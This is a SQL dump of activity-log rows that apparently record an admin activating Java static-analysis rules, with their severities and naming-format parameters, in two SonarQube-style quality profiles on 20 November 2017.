INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3203, '2017-11-20 12:20:26.817', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3959;ruleKey=squid:S3959;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX15BbbGRdfPp-rPn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3204, '2017-11-20 12:20:26.845', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3972;ruleKey=squid:S3972;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX15dbbGRdfPp-rPo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3205, '2017-11-20 12:20:26.873', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3981;ruleKey=squid:S3981;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX155bbGRdfPp-rPp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3206, '2017-11-20 12:20:26.901', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3984;ruleKey=squid:S3984;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX16VbbGRdfPp-rPq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3207, '2017-11-20 12:20:26.93', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3985;ruleKey=squid:S3985;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX16ybbGRdfPp-rPr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3208, '2017-11-20 12:20:26.95', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3986;ruleKey=squid:S3986;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX17GbbGRdfPp-rPs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3209, '2017-11-20 12:20:26.977', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S4032;ruleKey=squid:S4032;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX17hbbGRdfPp-rPt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3210, '2017-11-20 12:20:27.009', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S4034;ruleKey=squid:S4034;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX18BbbGRdfPp-rPu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3211, '2017-11-20 12:20:27.034', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S4042;ruleKey=squid:S4042;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX18abbGRdfPp-rPv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3212, '2017-11-20 12:20:27.072', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S4065;ruleKey=squid:S4065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX19AbbGRdfPp-rPw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3213, '2017-11-20 12:20:27.101', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S4087;ruleKey=squid:S4087;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX19dbbGRdfPp-rPx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3214, '2017-11-20 12:20:27.128', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S4143;ruleKey=squid:S4143;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX194bbGRdfPp-rPy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3215, '2017-11-20 12:20:27.156', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S4144;ruleKey=squid:S4144;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1-UbbGRdfPp-rPz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3216, '2017-11-20 12:20:27.182', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S4165;ruleKey=squid:S4165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1-ubbGRdfPp-rP0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3217, '2017-11-20 12:20:27.21', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S899;ruleKey=squid:S899;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1_KbbGRdfPp-rP1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3218, '2017-11-20 12:20:27.26', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:SwitchLastCaseIsDefaultCheck;ruleKey=squid:SwitchLastCaseIsDefaultCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1_8bbGRdfPp-rP2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3219, '2017-11-20 12:20:27.291', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:UnusedPrivateMethod;ruleKey=squid:UnusedPrivateMethod;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX2AbbbGRdfPp-rP3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3220, '2017-11-20 12:20:27.31', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:UselessImportCheck;ruleKey=squid:UselessImportCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX2AubbGRdfPp-rP4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3221, '2017-11-20 12:20:27.341', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:UselessParenthesesCheck;ruleKey=squid:UselessParenthesesCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX2BNbbGRdfPp-rP5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3222, '2017-11-20 12:51:19.625', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:common-java:DuplicatedBlocks;ruleKey=common-java:DuplicatedBlocks;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6PJbbGRdfPp-rP6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3223, '2017-11-20 12:51:19.665', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:AssignmentInSubExpressionCheck;ruleKey=squid:AssignmentInSubExpressionCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6PxbbGRdfPp-rP7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3224, '2017-11-20 12:51:19.696', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:CallToDeprecatedMethod;ruleKey=squid:CallToDeprecatedMethod;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6QQbbGRdfPp-rP8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3225, '2017-11-20 12:51:19.727', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:ClassVariableVisibilityCheck;ruleKey=squid:ClassVariableVisibilityCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6QvbbGRdfPp-rP9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3226, '2017-11-20 12:51:19.758', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:CommentedOutCodeLine;ruleKey=squid:CommentedOutCodeLine;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6RObbGRdfPp-rP-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3227, '2017-11-20 12:51:19.784', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:EmptyStatementUsageCheck;ruleKey=squid:EmptyStatementUsageCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6RobbGRdfPp-rP_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3228, '2017-11-20 12:51:19.825', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:ForLoopCounterChangedCheck;ruleKey=squid:ForLoopCounterChangedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6SRbbGRdfPp-rQA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3229, '2017-11-20 12:51:19.866', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:HiddenFieldCheck;ruleKey=squid:HiddenFieldCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6S6bbGRdfPp-rQB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3230, '2017-11-20 12:51:19.933', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:LabelsShouldNotBeUsedCheck;ruleKey=squid:LabelsShouldNotBeUsedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6T9bbGRdfPp-rQC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3231, '2017-11-20 12:51:19.977', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:MaximumInheritanceDepth;ruleKey=squid:MaximumInheritanceDepth;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;param_max=5;param_filteredClasses=;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6UpbbGRdfPp-rQD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3232, '2017-11-20 12:51:20.008', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:MissingDeprecatedCheck;ruleKey=squid:MissingDeprecatedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6VIbbGRdfPp-rQE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3233, '2017-11-20 12:51:20.051', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:ModifiersOrderCheck;ruleKey=squid:ModifiersOrderCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6VzbbGRdfPp-rQF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3234, '2017-11-20 12:51:20.094', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:ObjectFinalizeCheck;ruleKey=squid:ObjectFinalizeCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6WdbbGRdfPp-rQG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3235, '2017-11-20 12:51:20.123', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck;ruleKey=squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6W7bbGRdfPp-rQH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3236, '2017-11-20 12:51:20.148', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:ObjectFinalizeOverridenCheck;ruleKey=squid:ObjectFinalizeOverridenCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6XUbbGRdfPp-rQI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3237, '2017-11-20 12:51:20.189', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:RedundantThrowsDeclarationCheck;ruleKey=squid:RedundantThrowsDeclarationCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6X8bbGRdfPp-rQJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3238, '2017-11-20 12:51:20.23', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S00100;ruleKey=squid:S00100;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6YmbbGRdfPp-rQK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3239, '2017-11-20 12:51:20.265', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S00101;ruleKey=squid:S00101;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;param_format=^[A-Z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6ZJbbGRdfPp-rQL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3240, '2017-11-20 12:51:20.315', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S00107;ruleKey=squid:S00107;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;param_max=7;param_constructorMax=7;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6Z7bbGRdfPp-rQM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3241, '2017-11-20 12:51:20.35', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S00108;ruleKey=squid:S00108;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6aebbGRdfPp-rQN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3242, '2017-11-20 12:51:20.385', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S00112;ruleKey=squid:S00112;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6bBbbGRdfPp-rQO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3243, '2017-11-20 12:51:20.408', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S00114;ruleKey=squid:S00114;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;param_format=^[A-Z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6bYbbGRdfPp-rQP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3244, '2017-11-20 12:51:20.435', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S00115;ruleKey=squid:S00115;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;param_format=^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6bzbbGRdfPp-rQQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3245, '2017-11-20 12:51:20.463', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S00116;ruleKey=squid:S00116;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6cPbbGRdfPp-rQR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3246, '2017-11-20 12:51:20.494', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S00117;ruleKey=squid:S00117;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6cubbGRdfPp-rQS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3247, '2017-11-20 12:51:20.527', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S00119;ruleKey=squid:S00119;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;param_format=^[A-Z][0-9]?$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6dPbbGRdfPp-rQT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3248, '2017-11-20 12:51:20.557', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S00120;ruleKey=squid:S00120;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;param_format=^[a-z]+(\.[a-z][a-z0-9]*)*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6dtbbGRdfPp-rQU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3249, '2017-11-20 12:51:20.586', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S106;ruleKey=squid:S106;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6eKbbGRdfPp-rQV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3250, '2017-11-20 12:51:20.617', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1065;ruleKey=squid:S1065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6epbbGRdfPp-rQW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3251, '2017-11-20 12:51:20.637', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1066;ruleKey=squid:S1066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6e9bbGRdfPp-rQX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3252, '2017-11-20 12:51:20.664', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1068;ruleKey=squid:S1068;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6fYbbGRdfPp-rQY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3253, '2017-11-20 12:51:20.711', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1075;ruleKey=squid:S1075;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6gHbbGRdfPp-rQZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3254, '2017-11-20 12:51:20.741', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1118;ruleKey=squid:S1118;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6gkbbGRdfPp-rQa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3255, '2017-11-20 12:51:20.769', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1125;ruleKey=squid:S1125;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6hBbbGRdfPp-rQb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3256, '2017-11-20 12:51:20.799', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1126;ruleKey=squid:S1126;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6hfbbGRdfPp-rQc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3257, '2017-11-20 12:51:20.834', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1133;ruleKey=squid:S1133;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6iCbbGRdfPp-rQd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3258, '2017-11-20 12:51:20.912', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1134;ruleKey=squid:S1134;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6jQbbGRdfPp-rQe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3259, '2017-11-20 12:51:20.978', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1135;ruleKey=squid:S1135;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6kSbbGRdfPp-rQf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3260, '2017-11-20 12:51:21.043', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1141;ruleKey=squid:S1141;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6lTbbGRdfPp-rQg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3261, '2017-11-20 12:51:21.095', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1143;ruleKey=squid:S1143;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6mHbbGRdfPp-rQh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3262, '2017-11-20 12:51:21.121', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1148;ruleKey=squid:S1148;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6mhbbGRdfPp-rQi');
